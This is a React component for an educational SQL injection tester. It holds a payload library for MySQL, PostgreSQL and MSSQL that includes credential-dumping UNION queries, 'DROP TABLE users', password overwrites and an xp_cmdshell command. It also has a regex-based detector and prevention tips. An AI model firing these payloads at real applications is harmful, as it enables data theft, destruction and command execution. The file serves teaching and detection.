import React, { useState } from 'react';
import { Database, Play, AlertTriangle, Info, Copy, RotateCcw, Zap } from 'lucide-react';

const SQLInjectionTester = ({ onClose }) => {
  const [payload, setPayload] = useState('');
  const [injectionType, setInjectionType] = useState('union');
  const [dbType, setDbType] = useState('mysql');
  const [testResult, setTestResult] = useState(null);
  const [generatedPayload, setGeneratedPayload] = useState('');

  const injectionTypes = {
    union: {
      name: 'Union-based',
      description: 'Exploits UNION SQL operator to retrieve data from other tables',
      risk: 'High'
    },
    boolean: {
      name: 'Boolean-based',
      description: 'Uses boolean logic to infer information based on application responses',
      risk: 'Medium'
    },
    time: {
      name: 'Time-based',
      description: 'Uses database time delay functions to infer information',
      risk: 'Medium'
    },
    error: {
      name: 'Error-based',
      description: 'Exploits database error messages to extract information',
      risk: 'High'
    },
    stacked: {
      name: 'Stacked Queries',
      description: 'Executes multiple SQL statements in a single request',
      risk: 'Critical'
    }
  };

  const payloadLibrary = {
    mysql: {
      union: [
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT null,username,password FROM users--",
        "' UNION SELECT 1,database(),version()--",
        "' UNION SELECT 1,table_name,null FROM information_schema.tables--",
        "' UNION SELECT 1,column_name,null FROM information_schema.columns WHERE table_name='users'--"
      ],
      boolean: [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",
        "' AND LENGTH(database())>5--"
      ],
      time: [
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND (SELECT SLEEP(5))--",
        "'; SELECT SLEEP(5)--",
        "' AND IF(1=1,SLEEP(5),0)--",
        "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5))--"
      ],
      error: [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
        "' AND EXP(~(SELECT * FROM (SELECT USER())a))--"
      ],
      stacked: [
        "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
        "'; DROP TABLE users--",
        "'; UPDATE users SET password='hacked' WHERE id=1--",
        "'; CREATE TABLE temp (data VARCHAR(100))--"
      ]
    },
    postgresql: {
      union: [
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT null,username,password FROM users--",
        "' UNION SELECT 1,current_database(),version()--",
        "' UNION SELECT 1,table_name,null FROM information_schema.tables--"
      ],
      boolean: [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND LENGTH(current_database())>5--"
      ],
      time: [
        "'; SELECT pg_sleep(5)--",
        "' AND (SELECT pg_sleep(5))--",
        "' AND (SELECT COUNT(*) FROM pg_sleep(5))--"
      ],
      error: [
        "' AND CAST((SELECT version()) AS int)--",
        "' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--"
      ],
      stacked: [
        "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
        "'; DROP TABLE users--",
        "'; UPDATE users SET password='hacked' WHERE id=1--"
      ]
    },
    mssql: {
      union: [
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT null,name,null FROM sys.databases--",
        "' UNION SELECT 1,@@version,null--",
        "' UNION SELECT 1,name,null FROM sys.tables--"
      ],
      boolean: [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND LEN(DB_NAME())>5--"
      ],
      time: [
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND (SELECT COUNT(*) FROM users WHERE 1=1); WAITFOR DELAY '00:00:05'--"
      ],
      error: [
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=CONVERT(int,(SELECT name FROM sys.databases))--"
      ],
      stacked: [
        "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
        "'; DROP TABLE users--",
        "'; EXEC xp_cmdshell 'whoami'--"
      ]
    }
  };

  const generatePayload = () => {
    const payloads = payloadLibrary[dbType][injectionType];
    if (payloads && payloads.length > 0) {
      const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
      setGeneratedPayload(randomPayload);
      setPayload(randomPayload);
    }
  };

  const testPayload = () => {
    if (!payload.trim()) {
      setTestResult({ type: 'error', message: 'Please enter a payload to test' });
      return;
    }

    // Simulate SQL injection testing (safe environment)
    const sqlPatterns = [
      { pattern: /union\s+select/gi, name: 'UNION SELECT', severity: 'High' },
      { pattern: /'\s*(or|and)\s+\d+\s*=\s*\d+/gi, name: 'Boolean Logic', severity: 'Medium' },
      { pattern: /(sleep|waitfor|pg_sleep)\s*\(/gi, name: 'Time Delay', severity: 'Medium' },
      { pattern: /(drop|delete|insert|update)\s+/gi, name: 'Data Manipulation', severity: 'Critical' },
      { pattern: /information_schema/gi, name: 'Schema Enumeration', severity: 'High' },
      { pattern: /(exec|execute)\s+/gi, name: 'Command Execution', severity: 'Critical' },
      { pattern: /@@version|version\(\)/gi, name: 'Version Disclosure', severity: 'Medium' },
      { pattern: /extractvalue|updatexml/gi, name: 'XML Functions', severity: 'High' },
      { pattern: /concat\s*\(/gi, name: 'String Concatenation', severity: 'Low' },
      { pattern: /load_file|into\s+outfile/gi, name: 'File Operations', severity: 'Critical' }
    ];

    const detectedPatterns = [];
    let maxSeverity = 'Low';
    const severityLevels = { 'Low': 1, 'Medium': 2, 'High': 3, 'Critical': 4 };

    sqlPatterns.forEach(({ pattern, name, severity }) => {
      if (pattern.test(payload)) {
        detectedPatterns.push({ name, severity });
        if (severityLevels[severity] > severityLevels[maxSeverity]) {
          maxSeverity = severity;
        }
      }
    });

    if (detectedPatterns.length > 0) {
      setTestResult({
        type: 'danger',
        message: `⚠️ SQL Injection payload detected!`,
        patterns: detectedPatterns,
        severity: maxSeverity,
        injectionType: injectionTypes[injectionType].name,
        database: dbType.toUpperCase()
      });
    } else {
      setTestResult({
        type: 'safe',
        message: '✅ No obvious SQL injection patterns detected',
        severity: 'Safe'
      });
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
  };

  const getSeverityColor = (severity) => {
    switch (severity) {
      case 'Critical': return 'text-htb-red';
      case 'High': return 'text-htb-orange';
      case 'Medium': return 'text-htb-yellow';
      case 'Low': return 'text-htb-blue';
      default: return 'text-htb-gray';
    }
  };

  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
      <div className="htb-card rounded-lg max-w-5xl w-full max-h-[90vh] overflow-y-auto">
        <div className="p-6">
          {/* Header */}
          <div className="flex items-center justify-between mb-6">
            <div className="flex items-center space-x-3">
              <Database className="h-8 w-8 text-htb-green" />
              <div>
                <h2 className="text-2xl font-bold text-htb-gray-light">SQL Injection Tester</h2>
                <p className="text-htb-gray">Test SQL injection payloads and learn attack techniques</p>
              </div>
            </div>
            <button
              onClick={onClose}
              className="text-htb-gray hover:text-htb-red transition-colors"
            >
              ✕
            </button>
          </div>

          {/* Configuration */}
          <div className="grid md:grid-cols-3 gap-4 mb-6">
            <div>
              <label className="block text-sm font-medium text-htb-gray-light mb-2">
                Injection Type
              </label>
              <select
                value={injectionType}
                onChange={(e) => setInjectionType(e.target.value)}
                className="htb-input w-full p-2 rounded-lg"
              >
                {Object.entries(injectionTypes).map(([key, type]) => (
                  <option key={key} value={key}>
                    {type.name}
                  </option>
                ))}
              </select>
            </div>

            <div>
              <label className="block text-sm font-medium text-htb-gray-light mb-2">
                Database Type
              </label>
              <select
                value={dbType}
                onChange={(e) => setDbType(e.target.value)}
                className="htb-input w-full p-2 rounded-lg"
              >
                <option value="mysql">MySQL</option>
                <option value="postgresql">PostgreSQL</option>
                <option value="mssql">Microsoft SQL Server</option>
              </select>
            </div>

            <div className="flex items-end">
              <button
                onClick={generatePayload}
                className="htb-btn-secondary px-4 py-2 rounded-lg flex items-center space-x-2 w-full"
              >
                <Zap className="h-4 w-4" />
                <span>Generate Payload</span>
              </button>
            </div>
          </div>

          {/* Injection Type Info */}
          <div className="bg-htb-blue/10 border border-htb-blue/30 p-4 rounded-lg mb-6">
            <div className="flex items-start space-x-2">
              <Info className="h-5 w-5 text-htb-blue mt-0.5" />
              <div className="text-sm text-htb-blue">
                <p className="font-medium mb-1">
                  {injectionTypes[injectionType].name} - Risk: {injectionTypes[injectionType].risk}
                </p>
                <p className="opacity-90">{injectionTypes[injectionType].description}</p>
              </div>
            </div>
          </div>

          <div className="grid lg:grid-cols-2 gap-6">
            {/* Left Column - Payload Input */}
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-htb-gray-light mb-2">
                  SQL Injection Payload
                </label>
                <textarea
                  value={payload}
                  onChange={(e) => setPayload(e.target.value)}
                  placeholder="Enter your SQL injection payload here..."
                  className="htb-input w-full h-32 p-3 rounded-lg font-mono text-sm"
                />
              </div>

              <div className="flex space-x-2">
                <button
                  onClick={testPayload}
                  className="htb-btn-primary px-4 py-2 rounded-lg flex items-center space-x-2"
                >
                  <Play className="h-4 w-4" />
                  <span>Test Payload</span>
                </button>
                <button
                  onClick={() => {
                    setPayload('');
                    setTestResult(null);
                    setGeneratedPayload('');
                  }}
                  className="htb-btn-secondary px-4 py-2 rounded-lg flex items-center space-x-2"
                >
                  <RotateCcw className="h-4 w-4" />
                  <span>Clear</span>
                </button>
              </div>

              {/* Test Result */}
              {testResult && (
                <div className={`p-4 rounded-lg border ${
                  testResult.type === 'danger' 
                    ? 'bg-htb-red/10 border-htb-red/30'
                    : 'bg-htb-green/10 border-htb-green/30'
                }`}>
                  <div className="flex items-start space-x-2">
                    <AlertTriangle className={`h-5 w-5 mt-0.5 ${
                      testResult.type === 'danger' ? 'text-htb-red' : 'text-htb-green'
                    }`} />
                    <div className="flex-1">
                      <p className={`font-medium ${
                        testResult.type === 'danger' ? 'text-htb-red' : 'text-htb-green'
                      }`}>
                        {testResult.message}
                      </p>
                      {testResult.patterns && (
                        <div className="mt-2 space-y-1">
                          <p className="text-sm opacity-90">
                            Type: {testResult.injectionType} | Database: {testResult.database}
                          </p>
                          <p className="text-sm opacity-90">
                            Overall Severity: <span className={getSeverityColor(testResult.severity)}>
                              {testResult.severity}
                            </span>
                          </p>
                          <div className="mt-2">
                            <p className="text-sm font-medium mb-1">Detected Patterns:</p>
                            <div className="flex flex-wrap gap-1">
                              {testResult.patterns.map((pattern, index) => (
                                <span
                                  key={index}
                                  className={`px-2 py-1 rounded text-xs ${
                                    pattern.severity === 'Critical' ? 'bg-htb-red/20 text-htb-red' :
                                    pattern.severity === 'High' ? 'bg-htb-orange/20 text-htb-orange' :
                                    pattern.severity === 'Medium' ? 'bg-htb-yellow/20 text-htb-yellow' :
                                    'bg-htb-blue/20 text-htb-blue'
                                  }`}
                                >
                                  {pattern.name} ({pattern.severity})
                                </span>
                              ))}
                            </div>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}
            </div>

            {/* Right Column - Payload Library */}
            <div className="space-y-4">
              <h3 className="text-lg font-semibold text-htb-gray-light">
                {injectionTypes[injectionType].name} Payloads ({dbType.toUpperCase()})
              </h3>
              
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {payloadLibrary[dbType][injectionType]?.map((p, index) => (
                  <div
                    key={index}
                    className="bg-htb-dark-light p-3 rounded cursor-pointer hover:bg-htb-gray/10 transition-colors group"
                    onClick={() => setPayload(p)}
                  >
                    <div className="flex items-start justify-between">
                      <code className="text-xs text-htb-gray-light font-mono break-all flex-1 mr-2">
                        {p}
                      </code>
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          copyToClipboard(p);
                        }}
                        className="opacity-0 group-hover:opacity-100 text-htb-green hover:text-htb-green-light transition-opacity"
                      >
                        <Copy className="h-3 w-3" />
                      </button>
                    </div>
                  </div>
                )) || (
                  <p className="text-htb-gray text-sm">No payloads available for this combination</p>
                )}
              </div>

              {/* Educational Warning */}
              <div className="bg-htb-red/10 border border-htb-red/30 p-4 rounded-lg">
                <div className="flex items-start space-x-2">
                  <AlertTriangle className="h-5 w-5 text-htb-red mt-0.5" />
                  <div className="text-sm text-htb-red">
                    <p className="font-medium mb-1">Educational Use Only</p>
                    <p className="text-xs opacity-90">
                      Only test SQL injection on systems you own or have explicit permission to test. 
                      Unauthorized testing is illegal and unethical.
                    </p>
                  </div>
                </div>
              </div>

              {/* Prevention Tips */}
              <div className="bg-htb-green/10 border border-htb-green/30 p-4 rounded-lg">
                <div className="flex items-start space-x-2">
                  <Info className="h-5 w-5 text-htb-green mt-0.5" />
                  <div className="text-sm text-htb-green">
                    <p className="font-medium mb-1">Prevention Tips</p>
                    <ul className="text-xs opacity-90 space-y-1">
                      <li>• Use parameterized queries/prepared statements</li>
                      <li>• Validate and sanitize all user inputs</li>
                      <li>• Use least privilege database accounts</li>
                      <li>• Implement proper error handling</li>
                      <li>• Regular security testing and code reviews</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SQLInjectionTester;